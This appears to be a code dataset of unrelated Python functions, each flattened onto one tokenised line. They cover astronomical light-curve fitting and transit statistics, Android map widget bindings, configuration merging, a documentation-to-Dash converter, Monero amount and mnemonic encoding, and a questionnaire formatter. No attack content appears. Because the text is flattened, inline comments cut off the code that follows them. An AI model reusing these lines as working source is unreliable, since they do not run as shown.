def _epd_function ( coeffs , fsv , fdv , fkv , xcc , ycc , bgv , bge , iha , izd ) : return ( coeffs [ 0 ] * fsv * fsv + coeffs [ 1 ] * fsv + coeffs [ 2 ] * fdv * fdv + coeffs [ 3 ] * fdv + coeffs [ 4 ] * fkv * fkv + coeffs [ 5 ] * fkv + coeffs [ 6 ] + coeffs [ 7 ] * fsv * fdv + coeffs [ 8 ] * fsv * fkv + coeffs [ 9 ] * fdv * fkv + coeffs [ 10 ] * np . sin ( 2 * pi_value * xcc ) + coeffs [ 11 ] * np . cos ( 2 * pi_value * xcc ) + coeffs [ 12 ] * np . sin ( 2 * pi_value * ycc ) + coeffs [ 13 ] * np . cos ( 2 * pi_value * ycc ) + coeffs [ 14 ] * np . sin ( 4 * pi_value * xcc ) + coeffs [ 15 ] * np . cos ( 4 * pi_value * xcc ) + coeffs [ 16 ] * np . sin ( 4 * pi_value * ycc ) + coeffs [ 17 ] * np . cos ( 4 * pi_value * ycc ) + coeffs [ 18 ] * bgv + coeffs [ 19 ] * bge + coeffs [ 20 ] * iha + coeffs [ 21 ] * izd )
def _epd_residual ( coeffs , mags , fsv , fdv , fkv , xcc , ycc , bgv , bge , iha , izd ) : f = _epd_function ( coeffs , fsv , fdv , fkv , xcc , ycc , bgv , bge , iha , izd ) residual = mags - f return residual
def _get_legendre_deg_ctd ( npts ) : from scipy . interpolate import interp1d degs = nparray ( [ 4 , 5 , 6 , 10 , 15 ] ) pts = nparray ( [ 1e2 , 3e2 , 5e2 , 1e3 , 3e3 ] ) fn = interp1d ( pts , degs , kind = 'linear' , bounds_error = False , fill_value = ( min ( degs ) , max ( degs ) ) ) legendredeg = int ( npfloor ( fn ( npts ) ) ) return legendredeg
def _varfeatures_worker ( task ) : try : ( lcfile , outdir , timecols , magcols , errcols , mindet , lcformat , lcformatdir ) = task return get_varfeatures ( lcfile , outdir , timecols = timecols , magcols = magcols , errcols = errcols , mindet = mindet , lcformat = lcformat , lcformatdir = lcformatdir ) except Exception as e : return None
def _runpf_worker ( task ) : ( lcfile , outdir , timecols , magcols , errcols , lcformat , lcformatdir , pfmethods , pfkwargs , getblssnr , sigclip , nworkers , minobservations , excludeprocessed ) = task if os . path . exists ( lcfile ) : pfresult = runpf ( lcfile , outdir , timecols = timecols , magcols = magcols , errcols = errcols , lcformat = lcformat , lcformatdir = lcformatdir , pfmethods = pfmethods , pfkwargs = pfkwargs , getblssnr = getblssnr , sigclip = sigclip , nworkers = nworkers , minobservations = minobservations , excludeprocessed = excludeprocessed ) return pfresult else : LOGERROR ( 'LC does not exist for requested file %s' % lcfile ) return None
def read_hatpi_textlc ( lcfile ) : if 'TF1' in lcfile : thiscoldefs = COLDEFS + [ ( 'itf1' , float ) ] elif 'TF2' in lcfile : thiscoldefs = COLDEFS + [ ( 'itf2' , float ) ] elif 'TF3' in lcfile : thiscoldefs = COLDEFS + [ ( 'itf3' , float ) ] LOGINFO ( 'reading %s' % lcfile ) if lcfile . endswith ( '.gz' ) : infd = gzip . open ( lcfile , 'r' ) else : infd = open ( lcfile , 'r' ) with infd : lclines = infd . read ( ) . decode ( ) . split ( '\n' ) lclines = [ x . split ( ) for x in lclines if ( '#' not in x and len ( x ) > 0 ) ] ndet = len ( lclines ) if ndet > 0 : lccols = list ( zip ( * lclines ) ) lcdict = { x [ 0 ] : y for ( x , y ) in zip ( thiscoldefs , lccols ) } # convert to ndarray for col in thiscoldefs : lcdict [ col [ 0 ] ] = np . array ( [ col [ 1 ] ( x ) for x in lcdict [ col [ 0 ] ] ] ) else : lcdict = { } LOGWARNING ( 'no detections in %s' % lcfile ) # convert to empty ndarrays for col in thiscoldefs : lcdict [ col [ 0 ] ] = np . array ( [ ] ) # add the object's name to the lcdict hatid = HATIDREGEX . findall ( lcfile ) lcdict [ 'objectid' ] = hatid [ 0 ] if hatid else 'unknown object' # add the columns to the lcdict lcdict [ 'columns' ] = [ x [ 0 ] for x in thiscoldefs ] # add some basic info similar to usual HATLCs lcdict [ 'objectinfo' ] = { 'ndet' : ndet , 'hatid' : hatid [ 0 ] if hatid else 'unknown object' , 'network' : 'HP' , } # break out the {stationid}-{framenum}{framesub}_{ccdnum} framekey # into separate columns framekeyelems = FRAMEREGEX . findall ( '\n' . join ( lcdict [ 'frk' ] ) ) lcdict [ 'stf' ] = np . array ( [ ( int ( x [ 0 ] ) if x [ 0 ] . isdigit ( ) else np . nan ) for x in framekeyelems ] ) lcdict [ 'cfn' ] = np . array ( [ ( int ( x [ 1 ] ) if x [ 0 ] . isdigit ( ) else np . nan ) for x in framekeyelems ] ) lcdict [ 'cfs' ] = np . array ( [ x [ 2 ] for x in framekeyelems ] ) lcdict [ 'ccd' ] = np . array ( [ ( int ( x [ 3 ] ) if x [ 0 ] . isdigit ( ) else np . nan ) for x in framekeyelems ] ) # update the column list with these columns lcdict [ 'columns' ] . extend ( [ 'stf' , 'cfn' , 'cfs' , 'ccd' ] ) # add more objectinfo: 'stations', etc. lcdict [ 'objectinfo' ] [ 'network' ] = 'HP' lcdict [ 'objectinfo' ] [ 'stations' ] = [ 'HP%s' % x for x in np . unique ( lcdict [ 'stf' ] ) . tolist ( ) ] return lcdict
def read_hatpi_pklc ( lcfile ) : try : if lcfile . endswith ( '.gz' ) : infd = gzip . open ( lcfile , 'rb' ) else : infd = open ( lcfile , 'rb' ) lcdict = pickle . load ( infd ) infd . close ( ) return lcdict except UnicodeDecodeError : if lcfile . endswith ( '.gz' ) : infd = gzip . open ( lcfile , 'rb' ) else : infd = open ( lcfile , 'rb' ) LOGWARNING ( 'pickle %s was probably from Python 2 ' 'and failed to load without using "latin1" encoding. ' 'This is probably a numpy issue: ' 'http://stackoverflow.com/q/11305790' % lcfile ) lcdict = pickle . load ( infd , encoding = 'latin1' ) infd . close ( ) return lcdict
def parallel_concat_lcdir ( lcbasedir , objectidlist , aperture = 'TF1' , postfix = '.gz' , sortby = 'rjd' , normalize = True , outdir = None , recursive = True , nworkers = 32 , maxworkertasks = 1000 ) : if not outdir : outdir = 'pklcs' if not os . path . exists ( outdir ) : os . mkdir ( outdir ) tasks = [ ( lcbasedir , x , { 'aperture' : aperture , 'postfix' : postfix , 'sortby' : sortby , 'normalize' : normalize , 'outdir' : outdir , 'recursive' : recursive } ) for x in objectidlist ] pool = mp . Pool ( nworkers , maxtasksperchild = maxworkertasks ) results = pool . map ( parallel_concat_worker , tasks ) pool . close ( ) pool . join ( ) return { x : y for ( x , y ) in zip ( objectidlist , results ) }
def generate_hatpi_binnedlc_pkl ( binnedpklf , textlcf , timebinsec , outfile = None ) : binlcdict = read_hatpi_binnedlc ( binnedpklf , textlcf , timebinsec ) if binlcdict : if outfile is None : outfile = os . path . join ( os . path . dirname ( binnedpklf ) , '%s-hplc.pkl' % ( os . path . basename ( binnedpklf ) . replace ( 'sec-lc.pkl.gz' , '' ) ) ) return lcdict_to_pickle ( binlcdict , outfile = outfile ) else : LOGERROR ( 'could not read binned HATPI LC: %s' % binnedpklf ) return None
def _get_bls_stats ( stimes , smags , serrs , thistransdepth , thistransduration , ingressdurationfraction , nphasebins , thistransingressbin , thistransegressbin , thisbestperiod , thisnphasebins , magsarefluxes = False , verbose = False ) : try : # try getting the minimum light epoch using the phase bin method me_epochbin = int ( ( thistransegressbin + thistransingressbin ) / 2.0 ) me_phases = ( ( stimes - stimes . min ( ) ) / thisbestperiod - npfloor ( ( stimes - stimes . min ( ) ) / thisbestperiod ) ) me_phases_sortind = npargsort ( me_phases ) me_sorted_phases = me_phases [ me_phases_sortind ] me_sorted_times = stimes [ me_phases_sortind ] me_bins = nplinspace ( 0.0 , 1.0 , thisnphasebins ) me_bininds = npdigitize ( me_sorted_phases , me_bins ) me_centertransit_ind = me_bininds == me_epochbin me_centertransit_phase = ( npmedian ( me_sorted_phases [ me_centertransit_ind ] ) ) me_centertransit_timeloc = npwhere ( npabs ( me_sorted_phases - me_centertransit_phase ) == npmin ( npabs ( me_sorted_phases - me_centertransit_phase ) ) ) me_centertransit_time = me_sorted_times [ me_centertransit_timeloc ] if me_centertransit_time . size > 1 : LOGWARNING ( 'multiple possible times-of-center transits ' 'found for period %.7f, picking the first ' 'one from: %s' % ( thisbestperiod , repr ( me_centertransit_time ) ) ) thisminepoch = me_centertransit_time [ 0 ] except Exception as e : LOGEXCEPTION ( 'could not determine the center time of transit for ' 'the phased LC, trying SavGol fit instead...' ) # fit a Savitsky-Golay instead and get its minimum savfit = savgol_fit_magseries ( stimes , smags , serrs , thisbestperiod , magsarefluxes = magsarefluxes , verbose = verbose , sigclip = None ) thisminepoch = savfit [ 'fitinfo' ] [ 'fitepoch' ] if isinstance ( thisminepoch , npndarray ) : if verbose : LOGWARNING ( 'minimum epoch is actually an array:\n' '%s\n' 'instead of a float, ' 'are there duplicate time values ' 'in the original input? ' 'will use the first value in this array.' % repr ( thisminepoch ) ) thisminepoch = thisminepoch [ 0 ] # set up trapezoid transit model to fit for this LC transitparams = [ thisbestperiod , thisminepoch , thistransdepth , thistransduration , ingressdurationfraction * thistransduration ] modelfit = traptransit_fit_magseries ( stimes , smags , serrs , transitparams , sigclip = None , magsarefluxes = magsarefluxes , verbose = verbose ) # if the model fit succeeds, calculate SNR using the trapezoid model fit if modelfit and modelfit [ 'fitinfo' ] [ 'finalparams' ] is not None : fitparams = modelfit [ 'fitinfo' ] [ 'finalparams' ] fiterrs = modelfit [ 'fitinfo' ] [ 'finalparamerrs' ] modelmags , actualmags , modelphase = ( modelfit [ 'fitinfo' ] [ 'fitmags' ] , modelfit [ 'magseries' ] [ 'mags' ] , modelfit [ 'magseries' ] [ 'phase' ] ) subtractedmags = actualmags - modelmags subtractedrms = npstd ( subtractedmags ) fit_period , fit_epoch , fit_depth , fit_duration , fit_ingress_dur = ( fitparams ) npts_in_transit = modelfit [ 'fitinfo' ] [ 'ntransitpoints' ] transit_snr = ( npsqrt ( npts_in_transit ) * npabs ( fit_depth / subtractedrms ) ) if verbose : LOGINFO ( 'refit best period: %.6f, ' 'refit center of transit: %.5f' % ( fit_period , fit_epoch ) ) LOGINFO ( 'npoints in transit: %s' % npts_in_transit ) LOGINFO ( 'transit depth (delta): %.5f, ' 'frac transit length (q): %.3f, ' ' SNR: %.3f' % ( fit_depth , fit_duration , transit_snr ) ) return { 'period' : fit_period , 'epoch' : fit_epoch , 'snr' : transit_snr , 'transitdepth' : fit_depth , 'transitduration' : fit_duration , 'nphasebins' : nphasebins , 'transingressbin' : thistransingressbin , 'transegressbin' : thistransegressbin , 'npoints_in_transit' : npts_in_transit , 'blsmodel' : modelmags , 'subtractedmags' : subtractedmags , 'phasedmags' : actualmags , 'phases' : modelphase , 'fitparams' : fitparams , 'fiterrs' : fiterrs , 'fitinfo' : modelfit } # if the model fit doesn't work, then do the SNR calculation the old way else : # phase using this epoch phased_magseries = phase_magseries_with_errs ( stimes , smags , serrs , thisbestperiod , thisminepoch , wrap = False , sort = True ) tphase = phased_magseries [ 'phase' ] tmags = phased_magseries [ 'mags' ] # use the transit depth and duration to subtract the BLS transit # model from the phased mag series. we're centered about 0.0 as the # phase of the transit minimum so we need to look at stuff from # [0.0, transitphase] and [1.0-transitphase, 1.0] transitphase = thistransduration / 2.0 transitindices = ( ( tphase < transitphase ) | ( tphase > ( 1.0 - transitphase ) ) ) # this is the BLS model # constant = median(tmags) outside transit # constant = thistransitdepth inside transit blsmodel = npfull_like ( tmags , npmedian ( tmags ) ) if magsarefluxes : # eebls.f returns +ve transit depth for fluxes # so we need to subtract here to get fainter fluxes in transit blsmodel [ transitindices ] = ( blsmodel [ transitindices ] - thistransdepth ) else : # eebls.f returns -ve transit depth for magnitudes # so we need to subtract here to get fainter mags in transits blsmodel [ transitindices ] = ( blsmodel [ transitindices ] - thistransdepth ) # see __init__/get_snr_of_dip docstring for description of transit # SNR equation, which is what we use for `thissnr`. subtractedmags = tmags - blsmodel subtractedrms = npstd ( subtractedmags ) npts_in_transit = len ( tmags [ transitindices ] ) thissnr = ( npsqrt ( npts_in_transit ) * npabs ( thistransdepth / subtractedrms ) ) # tell user about stuff if verbose = True if verbose : LOGINFO ( 'refit best period: %.6f, ' 'refit center of transit: %.5f' % ( thisbestperiod , thisminepoch ) ) LOGINFO ( 'transit ingress phase = %.3f to %.3f' % ( 1.0 - transitphase , 1.0 ) ) LOGINFO ( 'transit egress phase = %.3f to %.3f' % ( 0.0 , transitphase ) ) LOGINFO ( 'npoints in transit: %s' % tmags [ transitindices ] . size ) LOGINFO ( 'transit depth (delta): %.5f, ' 'frac transit length (q): %.3f, ' ' SNR: %.3f' % ( thistransdepth , thistransduration , thissnr ) ) return { 'period' : thisbestperiod , 'epoch' : thisminepoch , 'snr' : thissnr , 'transitdepth' : thistransdepth , 'transitduration' : thistransduration , 'nphasebins' : nphasebins , 'transingressbin' : thistransingressbin , 'transegressbin' : thistransegressbin , 'blsmodel' : blsmodel , 'subtractedmags' : subtractedmags , 'phasedmags' : tmags , 'phases' : tphase }
def magbin_varind_gridsearch_worker ( task ) : simbasedir , gridpoint , magbinmedian = task try : res = get_recovered_variables_for_magbin ( simbasedir , magbinmedian , stetson_stdev_min = gridpoint [ 0 ] , inveta_stdev_min = gridpoint [ 1 ] , iqr_stdev_min = gridpoint [ 2 ] , statsonly = True ) return res except Exception as e : LOGEXCEPTION ( 'failed to get info for %s' % gridpoint ) return None
def _update_proxy ( self , change ) : if change [ 'type' ] == 'container' : #: Only update what's needed self . proxy . update_points ( change ) else : super ( MapPolyline , self ) . _update_proxy ( change )
def _update_proxy ( self , change ) : if change [ 'type' ] == 'container' : #: Only update what's needed self . proxy . update_points ( change ) else : super ( MapPolygon , self ) . _update_proxy ( change )
def handle_change ( self , change ) : op = change [ 'operation' ] if op in 'append' : self . add ( len ( change [ 'value' ] ) , LatLng ( * change [ 'item' ] ) ) elif op == 'insert' : self . add ( change [ 'index' ] , LatLng ( * change [ 'item' ] ) ) elif op == 'extend' : points = [ LatLng ( * p ) for p in change [ 'items' ] ] self . addAll ( [ bridge . encode ( c ) for c in points ] ) elif op == '__setitem__' : self . set ( change [ 'index' ] , LatLng ( * change [ 'newitem' ] ) ) elif op == 'pop' : self . remove ( change [ 'index' ] ) else : raise NotImplementedError ( "Unsupported change operation {}" . format ( op ) )
def create_widget ( self ) : self . init_options ( ) #: Retrieve the actual map MapFragment . newInstance ( self . options ) . then ( self . on_map_fragment_created ) # Holder for the fragment self . widget = FrameLayout ( self . get_context ( ) ) # I wrote this a few days ago and already forget how this hack works... # lol We can't simply get a map reference using getMapAsync in the # return value like we normally do with a normal call function return # value. The bridge design was modified to store an object that cannot # be decoded normally (via a standard Bridge.Packer) by saving the new # object in the cache returning the id of the handler or proxy that # invoked it. This way we can manually create a new id and pass that # "future reference-able" object as our listener. At which point the # bridge will create a reference entry in the cache for us with the of # the object we gave it. Once in the cache we can use it like any # bridge object we created. self . map = GoogleMap ( __id__ = bridge . generate_id ( ) )
def init_options ( self ) : self . options = GoogleMapOptions ( ) d = self . declaration self . set_map_type ( d . map_type ) if d . ambient_mode : self . set_ambient_mode ( d . ambient_mode ) if ( d . camera_position or d . camera_zoom or d . camera_tilt or d . camera_bearing ) : self . update_camera ( ) if d . map_bounds : self . set_map_bounds ( d . map_bounds ) if not d . show_compass : self . set_show_compass ( d . show_compass ) if not d . show_zoom_controls : self . set_show_zoom_controls ( d . show_zoom_controls ) if not d . show_toolbar : self . set_show_toolbar ( d . show_toolbar ) if d . lite_mode : self . set_lite_mode ( d . lite_mode ) if not d . rotate_gestures : self . set_rotate_gestures ( d . rotate_gestures ) if not d . scroll_gestures : self . set_scroll_gestures ( d . scroll_gestures ) if not d . tilt_gestures : self . set_tilt_gestures ( d . tilt_gestures ) if not d . zoom_gestures : self . set_zoom_gestures ( d . zoom_gestures ) if d . min_zoom : self . set_min_zoom ( d . min_zoom ) if d . max_zoom : self . set_max_zoom ( d . max_zoom )
def init_map ( self ) : d = self . declaration if d . show_location : self . set_show_location ( d . show_location ) if d . show_traffic : self . set_show_traffic ( d . show_traffic ) if d . show_indoors : self . set_show_indoors ( d . show_indoors ) if d . show_buildings : self . set_show_buildings ( d . show_buildings ) #: Local ref access is faster mapview = self . map mid = mapview . getId ( ) #: Connect signals #: Camera mapview . onCameraChange . connect ( self . on_camera_changed ) mapview . onCameraMoveStarted . connect ( self . on_camera_move_started ) mapview . onCameraMoveCanceled . connect ( self . on_camera_move_stopped ) mapview . onCameraIdle . connect ( self . on_camera_move_stopped ) mapview . setOnCameraChangeListener ( mid ) mapview . setOnCameraMoveStartedListener ( mid ) mapview . setOnCameraMoveCanceledListener ( mid ) mapview . setOnCameraIdleListener ( mid ) #: Clicks mapview . onMapClick . connect ( self . on_map_clicked ) mapview . setOnMapClickListener ( mid ) mapview . onMapLongClick . connect ( self . on_map_long_clicked ) mapview . setOnMapLongClickListener ( mid ) #: Markers mapview . onMarkerClick . connect ( self . on_marker_clicked ) mapview . setOnMarkerClickListener ( self . map . getId ( ) ) mapview . onMarkerDragStart . connect ( self . on_marker_drag_start ) mapview . onMarkerDrag . connect ( self . on_marker_drag ) mapview . onMarkerDragEnd . connect ( self . on_marker_drag_end ) mapview . setOnMarkerDragListener ( mid ) #: Info window mapview . onInfoWindowClick . connect ( self . on_info_window_clicked ) mapview . onInfoWindowLongClick . connect ( self . on_info_window_long_clicked ) mapview . onInfoWindowClose . connect ( self . on_info_window_closed ) mapview . setOnInfoWindowClickListener ( mid ) mapview . setOnInfoWindowCloseListener ( mid ) mapview . setOnInfoWindowLongClickListener ( mid ) #: Polys mapview . onPolygonClick . connect ( self . on_poly_clicked ) mapview . onPolylineClick . connect ( self . on_poly_clicked ) mapview . setOnPolygonClickListener ( mid ) mapview . setOnPolylineClickListener ( mid ) #: Circle mapview . onCircleClick . connect ( self . on_circle_clicked ) mapview . setOnCircleClickListener ( mid )
def on_map_fragment_created ( self , obj_id ) : self . fragment = MapFragment ( __id__ = obj_id ) #: Setup callback so we know when the map is ready self . map . onMapReady . connect ( self . on_map_ready ) self . fragment . getMapAsync ( self . map . getId ( ) ) context = self . get_context ( ) def on_transaction ( id ) : trans = FragmentTransaction ( __id__ = id ) trans . add ( self . widget . getId ( ) , self . fragment ) trans . commit ( ) def on_fragment_manager ( id ) : fm = FragmentManager ( __id__ = id ) fm . beginTransaction ( ) . then ( on_transaction ) context . widget . getSupportFragmentManager ( ) . then ( on_fragment_manager )
def on_map_clicked ( self , pos ) : d = self . declaration d . clicked ( { 'click' : 'short' , 'position' : tuple ( pos ) } )
def on_map_long_clicked ( self , pos ) : d = self . declaration d . clicked ( { 'click' : 'long' , 'position' : tuple ( pos ) } )
def destroy ( self ) : marker = self . marker parent = self . parent ( ) if marker : if parent : del parent . markers [ marker . __id__ ] marker . remove ( ) super ( AndroidMapItemBase , self ) . destroy ( )
def child_added ( self , child ) : if child . widget : # TODO: Should we keep count and remove the adapter if not all # markers request it? self . parent ( ) . init_info_window_adapter ( ) super ( AndroidMapMarker , self ) . child_added ( child )
def on_marker ( self , marker ) : mid , pos = marker self . marker = Marker ( __id__ = mid ) mapview = self . parent ( ) # Save ref mapview . markers [ mid ] = self # Required so the packer can pass the id self . marker . setTag ( mid ) # If we have a child widget we must configure the map to use the # custom adapter for w in self . child_widgets ( ) : mapview . init_info_window_adapter ( ) break d = self . declaration if d . show_info : self . set_show_info ( d . show_info ) #: Can free the options now del self . options
def on_marker ( self , mid ) : self . marker = Circle ( __id__ = mid ) self . parent ( ) . markers [ mid ] = self #: Required so the packer can pass the id self . marker . setTag ( mid ) d = self . declaration if d . clickable : self . set_clickable ( d . clickable ) #: Can free the options now del self . options
def data ( self , X = None , y = None , sentences = None ) : self . X = X self . y = y self . sentences = sentences
def train ( self ) : for i , model in enumerate ( self . models ) : N = [ int ( i * len ( self . y ) ) for i in self . lc_range ] for n in N : X = self . X [ : n ] y = self . y [ : n ] e = Experiment ( X , y , model . estimator , self . scores , self . validation_method ) e . log_folder = self . log_folder e . train ( )
def print_cm ( cm , labels , hide_zeroes = False , hide_diagonal = False , hide_threshold = None ) : columnwidth = max ( [ len ( x ) for x in labels ] + [ 5 ] ) # 5 is value length empty_cell = " " * columnwidth # Print header print ( "    " + empty_cell , end = " " ) for label in labels : print ( "%{0}s" . format ( columnwidth ) % label , end = " " ) print ( ) # Print rows for i , label1 in enumerate ( labels ) : print ( "    %{0}s" . format ( columnwidth ) % label1 , end = " " ) for j in range ( len ( labels ) ) : cell = "%{0}.1f" . format ( columnwidth ) % cm [ i , j ] if hide_zeroes : cell = cell if float ( cm [ i , j ] ) != 0 else empty_cell if hide_diagonal : cell = cell if i != j else empty_cell if hide_threshold : cell = cell if cm [ i , j ] > hide_threshold else empty_cell print ( cell , end = " " ) print ( )
def config_sources ( app , environment , cluster , configs_dirs , app_dir , local = False , build = False ) : sources = [ # Machine-specific ( configs_dirs , 'hostname' ) , ( configs_dirs , 'hostname-local' ) , ( configs_dirs , 'hostname-build' ) , # Global ( configs_dirs , 'common' ) , # Environment + Cluster ( configs_dirs , 'common-%s' % environment ) , ( configs_dirs , 'common-%s-%s' % ( environment , cluster ) ) , ( configs_dirs , 'common-local' ) , ( configs_dirs , 'common-build' ) , # Machine-specific overrides ( configs_dirs , 'common-overrides' ) , # Application-specific ( [ app_dir ] , '%s-default' % app ) , ( [ app_dir ] , '%s-%s' % ( app , environment ) ) , ( [ app_dir ] , '%s-%s-%s' % ( app , environment , cluster ) ) , ( configs_dirs , app ) , ( configs_dirs , '%s-%s' % ( app , environment ) ) , ( configs_dirs , '%s-%s-%s' % ( app , environment , cluster ) ) , ( [ app_dir ] , '%s-local' % app ) , ( [ app_dir ] , '%s-build' % app ) , ( configs_dirs , '%s-local' % app ) , ( configs_dirs , '%s-build' % app ) , # Machine-specific application override ( configs_dirs , '%s-overrides' % app ) , ] # Filter out build sources if not requested if not build : sources = [ source for source in sources if not source [ 1 ] . endswith ( '-build' ) ] # Filter out local sources if not build and not local if not local : sources = [ source for source in sources if not source [ 1 ] . endswith ( '-local' ) ] return available_sources ( sources )
def available_sources ( sources ) : for dirs , name in sources : for directory in dirs : fn = os . path . join ( directory , name ) + '.py' if os . path . isfile ( fn ) : yield fn
def smush_config ( sources , initial = None ) : if initial is None : initial = { } config = DotDict ( initial ) for fn in sources : log . debug ( 'Merging %s' , fn ) mod = get_config_module ( fn ) config = mod . update ( config ) log . debug ( 'Current config:\n%s' , json . dumps ( config , indent = 4 , cls = LenientJSONEncoder ) ) return config
def filter_dict ( unfiltered , filter_keys ) : filtered = DotDict ( ) for k in filter_keys : filtered [ k ] = unfiltered [ k ] return filtered
def filter_config ( config , deploy_config ) : if not os . path . isfile ( deploy_config ) : return DotDict ( ) config_module = get_config_module ( deploy_config ) return config_module . filter ( config )
def seeded_auth_token ( client , service , seed ) : hash_func = hashlib . md5 ( ) token = ',' . join ( ( client , service , seed ) ) . encode ( 'utf-8' ) hash_func . update ( token ) return hash_func . hexdigest ( )
def write_config ( config , app_dir , filename = 'configuration.json' ) : path = os . path . join ( app_dir , filename ) with open ( path , 'w' ) as f : json . dump ( config , f , indent = 4 , cls = DetectMissingEncoder , separators = ( ',' , ': ' ) )
def validate_date ( date_text ) : try : if int ( date_text ) < 0 : return True except ValueError : pass try : datetime . strptime ( date_text , '%Y-%m-%d' ) return True except ValueError : pass raise ValueError ( 'Dates must be negative integers or YYYY-MM-DD in the past.' )
def get_download_total ( rows ) : headers = rows . pop ( 0 ) index = headers . index ( 'download_count' ) total_downloads = sum ( int ( row [ index ] ) for row in rows ) rows . insert ( 0 , headers ) return total_downloads , index
def add_download_total ( rows ) : total_row = [ "" ] * len ( rows [ 0 ] ) total_row [ 0 ] = "Total" total_downloads , downloads_column = get_download_total ( rows ) total_row [ downloads_column ] = str ( total_downloads ) rows . append ( total_row ) return rows
def find_and_patch_entry ( soup , entry ) : link = soup . find ( "a" , { "class" : "headerlink" } , href = "#" + entry . anchor ) tag = soup . new_tag ( "a" ) tag [ "name" ] = APPLE_REF_TEMPLATE . format ( entry . type , entry . name ) if link : link . parent . insert ( 0 , tag ) return True elif entry . anchor . startswith ( "module-" ) : soup . h1 . parent . insert ( 0 , tag ) return True else : return False
def main ( source , force , name , quiet , verbose , destination , add_to_dash , add_to_global , icon , index_page , enable_js , online_redirect_url , parser , ) : try : logging . config . dictConfig ( create_log_config ( verbose = verbose , quiet = quiet ) ) except ValueError as e : click . secho ( e . args [ 0 ] , fg = "red" ) raise SystemExit ( 1 ) if icon : icon_data = icon . read ( ) if not icon_data . startswith ( PNG_HEADER ) : log . error ( '"{}" is not a valid PNG image.' . format ( click . format_filename ( icon . name ) ) ) raise SystemExit ( 1 ) else : icon_data = None source , dest , name = setup_paths ( source , destination , name = name , add_to_global = add_to_global , force = force , ) if parser is None : parser = parsers . get_doctype ( source ) if parser is None : log . error ( '"{}" does not contain a known documentation format.' . format ( click . format_filename ( source ) ) ) raise SystemExit ( errno . EINVAL ) docset = prepare_docset ( source , dest , name , index_page , enable_js , online_redirect_url ) doc_parser = parser ( doc_path = docset . docs ) log . info ( ( "Converting " + click . style ( "{parser_name}" , bold = True ) + ' docs from "{src}" to "{dst}".' ) . format ( parser_name = parser . name , src = click . format_filename ( source , shorten = True ) , dst = click . format_filename ( dest ) , ) ) with docset . db_conn : log . info ( "Parsing documentation..." ) toc = patch_anchors ( doc_parser , show_progressbar = not quiet ) for entry in doc_parser . parse ( ) : docset . db_conn . execute ( "INSERT INTO searchIndex VALUES (NULL, ?, ?, ?)" , entry . as_tuple ( ) , ) toc . send ( entry ) count = docset . db_conn . execute ( "SELECT COUNT(1) FROM searchIndex" ) . fetchone ( ) [ 0 ] log . info ( ( "Added " + click . style ( "{count:,}" , fg = "green" if count > 0 else "red" ) + " index entries." ) . format ( count = count ) ) toc . close ( ) if icon_data : add_icon ( icon_data , dest ) if add_to_dash or add_to_global : log . info ( "Adding to Dash.app..." ) os . system ( 'open -a dash "{}"' . format ( dest ) )
def create_log_config ( verbose , quiet ) : if verbose and quiet : raise ValueError ( "Supplying both --quiet and --verbose makes no sense." ) elif verbose : level = logging . DEBUG elif quiet : level = logging . ERROR else : level = logging . INFO logger_cfg = { "handlers" : [ "click_handler" ] , "level" : level } return { "version" : 1 , "formatters" : { "click_formatter" : { "format" : "%(message)s" } } , "handlers" : { "click_handler" : { "level" : level , "class" : "doc2dash.__main__.ClickEchoHandler" , "formatter" : "click_formatter" , } } , "loggers" : { "doc2dash" : logger_cfg , "__main__" : logger_cfg } , }
def setup_paths ( source , destination , name , add_to_global , force ) : if source [ - 1 ] == "/" : source = source [ : - 1 ] if not name : name = os . path . split ( source ) [ - 1 ] elif name . endswith ( ".docset" ) : name = name . replace ( ".docset" , "" ) if add_to_global : destination = DEFAULT_DOCSET_PATH dest = os . path . join ( destination or "" , name + ".docset" ) dst_exists = os . path . lexists ( dest ) if dst_exists and force : shutil . rmtree ( dest ) elif dst_exists : log . error ( 'Destination path "{}" already exists.' . format ( click . format_filename ( dest ) ) ) raise SystemExit ( errno . EEXIST ) return source , dest , name
def add_icon ( icon_data , dest ) : with open ( os . path . join ( dest , "icon.png" ) , "wb" ) as f : f . write ( icon_data )
def has_file_with ( path , filename , content ) : try : with open ( os . path . join ( path , filename ) , "rb" ) as f : return content in f . read ( ) except IOError as e : if e . errno == errno . ENOENT : return False else : raise
def to_atomic ( amount ) : if not isinstance ( amount , ( Decimal , float ) + _integer_types ) : raise ValueError ( "Amount '{}' doesn't have numeric type. Only Decimal, int, long and " "float (not recommended) are accepted as amounts." ) return int ( amount * 10 ** 12 )
def encode ( cls , hex ) : out = [ ] for i in range ( len ( hex ) // 8 ) : word = endian_swap ( hex [ 8 * i : 8 * i + 8 ] ) x = int ( word , 16 ) w1 = x % cls . n w2 = ( x // cls . n + w1 ) % cls . n w3 = ( x // cls . n // cls . n + w2 ) % cls . n out += [ cls . word_list [ w1 ] , cls . word_list [ w2 ] , cls . word_list [ w3 ] ] checksum = cls . get_checksum ( " " . join ( out ) ) out . append ( checksum ) return " " . join ( out )
def decode ( cls , phrase ) : phrase = phrase . split ( " " ) out = "" for i in range ( len ( phrase ) // 3 ) : word1 , word2 , word3 = phrase [ 3 * i : 3 * i + 3 ] w1 = cls . word_list . index ( word1 ) w2 = cls . word_list . index ( word2 ) % cls . n w3 = cls . word_list . index ( word3 ) % cls . n x = w1 + cls . n * ( ( w2 - w1 ) % cls . n ) + cls . n * cls . n * ( ( w3 - w2 ) % cls . n ) out += endian_swap ( "%08x" % x ) return out
def get_operator ( self , op ) : if op in self . OPERATORS : return self . OPERATORS . get ( op ) try : n_args = len ( inspect . getargspec ( op ) [ 0 ] ) if n_args != 2 : raise TypeError except : eprint ( 'Error: invalid operator function. Operators must accept two args.' ) raise else : return op
def format_answers ( self , fmt = 'obj' ) : fmts = ( 'obj' , 'array' , 'plain' ) if fmt not in fmts : eprint ( "Error: '{}' not in {}" . format ( fmt , fmts ) ) return def stringify ( val ) : if type ( val ) in ( list , tuple ) : return ', ' . join ( str ( e ) for e in val ) return val if fmt == 'obj' : return json . dumps ( self . answers ) elif fmt == 'array' : answers = [ [ k , v ] for k , v in self . answers . items ( ) ] return json . dumps ( answers ) elif fmt == 'plain' : answers = '\n' . join ( '{}: {}' . format ( k , stringify ( v ) ) for k , v in self . answers . items ( ) ) return answers
def answer_display ( self , s = '' ) : padding = len ( max ( self . questions . keys ( ) , key = len ) ) + 5 for key in list ( self . answers . keys ( ) ) : s += '{:>{}} : {}\n' . format ( key , padding , self . answers [ key ] ) return s
def _train_and_save ( obj , cache , data , print_updates ) : obj . train ( data ) if print_updates : print ( 'Regenerated ' + obj . name + '.' ) obj . save ( cache )
